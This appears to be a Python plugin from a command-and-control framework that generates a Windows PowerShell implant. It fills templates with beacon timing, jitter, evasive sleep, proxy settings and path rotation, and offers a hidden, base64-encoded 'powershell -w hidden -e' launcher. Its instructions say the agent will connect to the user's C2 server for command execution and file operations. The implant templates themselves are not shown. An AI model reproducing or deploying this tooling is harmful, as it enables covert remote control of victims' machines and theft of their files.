import os
import base64
import json
import time
import datetime
from typing import Dict, Any, List, Optional, Union

from plugins.agent_plugin_interface import AgentPluginInterface


class PowerShellAgent(AgentPluginInterface):
    """PowerShell agent plugin implementation"""
    
    @classmethod
    def get_name(cls) -> str:
        """Return the name of this agent type for UI display"""
        return "PowerShell"
    
    @classmethod
    def get_description(cls) -> str:
        """Return a description of this agent type"""
        return "A PowerShell-based agent with secure key exchange, path rotation, and file operations"
    
    @classmethod
    def get_options(cls) -> Dict[str, Dict[str, Any]]:
        """Return configuration options for PowerShell agent"""
        return {
            "beacon_period": {
                "type": "int",
                "default": 5,
                "description": "Beacon interval in seconds - how often the agent checks in",
                "required": True
            },
            "jitter_percentage": {
                "type": "int",
                "default": 20,
                "description": "Random variation in beacon timing (percentage)",
                "required": True
            },
            "random_sleep_enabled": {
                "type": "bool",
                "default": False,
                "description": "Enable random sleep between operations for OPSEC",
                "required": False
            },
            "max_sleep_time": {
                "type": "int",
                "default": 10,
                "description": "Maximum sleep time in seconds (if random sleep enabled)",
                "required": False
            },
            "max_failures": {
                "type": "int",
                "default": 3,
                "description": "Maximum connection failures before using fallback paths",
                "required": False
            },
            "max_backoff_time": {
                "type": "int",
                "default": 10,
                "description": "Maximum time between reconnection attempts in seconds",
                "required": False
            },
            "user_agent": {
                "type": "string",
                "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "description": "User-Agent string for HTTP requests",
                "required": False
            },
            "proxy_enabled": {
                "type": "bool",
                "default": False,
                "description": "Enable proxy for HTTP requests",
                "required": False
            },
            "proxy_type": {
                "type": "list",
                "default": "system",
                "description": "Type of proxy to use",
                "required": False,
                "values": ["system", "http", "socks4", "socks5"]
            },
            "proxy_server": {
                "type": "string",
                "default": "",
                "description": "Proxy server address (hostname or IP)",
                "required": False
            },
            "proxy_port": {
                "type": "string",
                "default": "",
                "description": "Proxy server port",
                "required": False
            },
            "username": {
                "type": "string",
                "default": "",
                "description": "Username for proxy or HTTP authentication (optional)",
                "required": False
            },
            "password": {
                "type": "string",
                "default": "",
                "description": "Password for proxy or HTTP authentication (optional)",
                "required": False
            },
            "format": {
                "type": "list",
                "default": "ps1",
                "description": "Output format for the agent",
                "required": False,
                "values": ["ps1", "base64", "encoded_command"]
            }
        }
    
    @classmethod
    def get_agent_capabilities(cls) -> List[str]:
        """Return capabilities supported by PowerShell agent"""
        return [
            "file_operations", 
            "dynamic_path_rotation", 
            "secure_key_exchange",
            "system_information",
            "command_execution"
        ]
    
    @classmethod
    def get_supported_platforms(cls) -> List[str]:
        """Return platforms supported by PowerShell agent"""
        return ["windows"]
    
    @classmethod
    def _load_template(cls, template_name: str) -> str:
        """
        Load a template file from the templates directory
        
        Args:
            template_name: Name of the template file
            
        Returns:
            Template content as string
        """
        templates_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "helpers", 
            "powershell"
        )
        
        template_path = os.path.join(templates_dir, template_name)
        
        # Check if template exists
        if not os.path.exists(template_path):
            raise FileNotFoundError(f"Template not found: {template_path}")
        
        with open(template_path, 'r') as f:
            return f.read()
    
    @classmethod
    def _generate_agent_code(cls, config: Dict[str, Any], campaign_settings: Dict[str, Any]) -> str:
        """
        Generate PowerShell agent code based on configuration
        
        Args:
            config: Plugin-specific configuration
            campaign_settings: Campaign-wide settings
            
        Returns:
            Generated PowerShell agent code
        """
        # Extract required campaign settings
        server_address = campaign_settings.get("server_address", "")
        rotation_info = campaign_settings.get("rotation_info", None)
        
        # Load templates
        agent_template = cls._load_template("agent.template.ps1")
        path_rotation_template = cls._load_template("path_rotation.template.ps1")
        file_operations_template = cls._load_template("file_operations.template.ps1")
        
        # Extract configuration values
        beacon_interval = config.get("beacon_period", 5)
        jitter_percentage = config.get("jitter_percentage", 20)
        random_sleep_enabled = config.get("random_sleep_enabled", False)
        max_sleep_time = config.get("max_sleep_time", 10)
        max_failures = config.get("max_failures", 3)
        max_backoff_time = config.get("max_backoff_time", 10)
        user_agent = config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
        proxy_enabled = config.get("proxy_enabled", False)
        proxy_type = config.get("proxy_type", "system")
        proxy_server = config.get("proxy_server", "")
        proxy_port = config.get("proxy_port", "")
        username = config.get("username", "")
        password = config.get("password", "")
        
        # Configure path rotation
        if rotation_info is None:
            rotation_id = "0"
            next_rotation = str(int(time.time()) + 3600)
            rotation_interval = "3600"
            path_pool_code = "$global:pathPool = @()"
        else:
            rotation_id = str(rotation_info.get('current_rotation_id', 0))
            next_rotation = str(rotation_info.get('next_rotation_time', 0))
            rotation_interval = str(rotation_info.get('rotation_interval', 3600))
            
            # Extract path pool from rotation info
            path_pool = rotation_info.get('current_paths', {}).get('path_pool', [])
            if path_pool:
                path_pool_str = "'" + "', '".join(path_pool) + "'"
                path_pool_code = f"$global:pathPool = @({path_pool_str})"
            else:
                path_pool_code = "$global:pathPool = @()"
        
        # Fill in the path rotation template
        path_rotation_code = path_rotation_template
        path_rotation_code = path_rotation_code.replace("{{ROTATION_ID}}", str(rotation_id))
        path_rotation_code = path_rotation_code.replace("{{NEXT_ROTATION_TIME}}", str(next_rotation))
        path_rotation_code = path_rotation_code.replace("{{ROTATION_INTERVAL}}", str(rotation_interval))
        
        # No need to replace these placeholder paths in pool-only mode, they're not used
        path_rotation_code = path_rotation_code.replace("{{BEACON_PATH}}", "")
        path_rotation_code = path_rotation_code.replace("{{CMD_RESULT_PATH}}", "")
        path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", "")
        path_rotation_code = path_rotation_code.replace("{{FILE_REQUEST_PATH}}", "")
        
        # Update path pool with the provided path pool code
        path_rotation_code = path_rotation_code.replace("$global:pathPool = @()", path_pool_code)
        
        # Convert boolean values to PowerShell format
        random_sleep_enabled_ps = "$true" if random_sleep_enabled else "$false"
        proxy_enabled_ps = "$true" if proxy_enabled else "$false"
        
        # Fill in the agent template with all values
        agent_code = agent_template
        agent_code = agent_code.replace("{{SERVER_ADDRESS}}", server_address)
        agent_code = agent_code.replace("{{BEACON_PATH}}", "")  # Not needed in pool-only mode
        agent_code = agent_code.replace("{{CMD_RESULT_PATH}}", "")  # Not needed in pool-only mode
        agent_code = agent_code.replace("{{PATH_ROTATION_CODE}}", path_rotation_code)
        agent_code = agent_code.replace("{{FILE_OPERATIONS_CODE}}", file_operations_template)
        agent_code = agent_code.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
        agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
        agent_code = agent_code.replace("{{MAX_FAILURES}}", str(max_failures))
        agent_code = agent_code.replace("{{MAX_BACKOFF}}", str(max_backoff_time))
        agent_code = agent_code.replace("{{RANDOM_SLEEP_ENABLED}}", random_sleep_enabled_ps)
        agent_code = agent_code.replace("{{MAX_SLEEP_TIME}}", str(max_sleep_time))
        agent_code = agent_code.replace("{{USER_AGENT}}", user_agent)
        agent_code = agent_code.replace("{{USERNAME}}", username)
        agent_code = agent_code.replace("{{PASSWORD}}", password)
        agent_code = agent_code.replace("{{PROXY_ENABLED}}", proxy_enabled_ps)
        agent_code = agent_code.replace("{{PROXY_TYPE}}", proxy_type)
        agent_code = agent_code.replace("{{PROXY_SERVER}}", proxy_server)
        agent_code = agent_code.replace("{{PROXY_PORT}}", proxy_port)
        
        return agent_code
    
    @classmethod
    def _generate_base64(cls, agent_code: str) -> str:
        """
        Convert PowerShell code to Base64-encoded command
        
        Args:
            agent_code: PowerShell agent code
            
        Returns:
            Base64-encoded PowerShell command
        """
        encoded = base64.b64encode(agent_code.encode("UTF-8")).decode("UTF-8")
        powershell_command = f"powershell -w hidden -e {encoded}"
        return powershell_command
    
    @classmethod
    def generate(cls, config: Dict[str, Any], campaign_settings: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate the PowerShell agent using the provided configuration
        
        Args:
            config: Dictionary containing plugin-specific configuration
            campaign_settings: Dictionary containing campaign-wide settings
            
        Returns:
            Dictionary containing:
                "code": Generated agent code
                "files": List of file paths generated (if any)
                "instructions": User instructions
                "summary": Short summary of what was generated
        """
        # Validate configuration
        errors = cls.validate_config(config)
        if errors:
            error_msg = "\n".join([f"{key}: {', '.join(msgs)}" for key, msgs in errors.items()])
            raise ValueError(f"Configuration validation failed:\n{error_msg}")
        
        # Generate the PowerShell agent code
        agent_code = cls._generate_agent_code(config, campaign_settings)
        
        # Determine output format
        output_format = config.get("format", "ps1")
        
        # Create base64 or encoded command if requested
        if output_format == "base64" or output_format == "encoded_command":
            encoded_command = cls._generate_base64(agent_code)
        
        # Save to file if campaign folder is provided
        files = []
        if "campaign_folder" in campaign_settings:
            campaign_folder = campaign_settings["campaign_folder"]
            agents_folder = os.path.join(campaign_folder, "agents")
            os.makedirs(agents_folder, exist_ok=True)
            
            # Save raw PowerShell file
            ps1_path = os.path.join(agents_folder, "powershell_agent.ps1")
            with open(ps1_path, 'w') as f:
                f.write(agent_code)
            files.append(ps1_path)
            
            # Save encoded command if generated
            if output_format == "base64" or output_format == "encoded_command":
                encoded_path = os.path.join(agents_folder, "powershell_encoded.txt")
                with open(encoded_path, 'w') as f:
                    f.write(encoded_command)
                files.append(encoded_path)
        
        # Prepare result
        result = {
            "code": encoded_command if output_format == "base64" or output_format == "encoded_command" else agent_code,
            "files": files,
            "instructions": (
                "Run the PowerShell command in a terminal to execute the agent. "
                "The agent will establish a connection to your C2 server "
                f"at {campaign_settings.get('server_address', 'UNKNOWN')}."
            ),
            "summary": (
                f"PowerShell {'Base64 encoded ' if output_format != 'ps1' else ''}agent generated with "
                f"{config.get('beacon_period', 5)}s beacon interval "
                f"and {config.get('jitter_percentage', 20)}% jitter."
            )
        }
        
        return result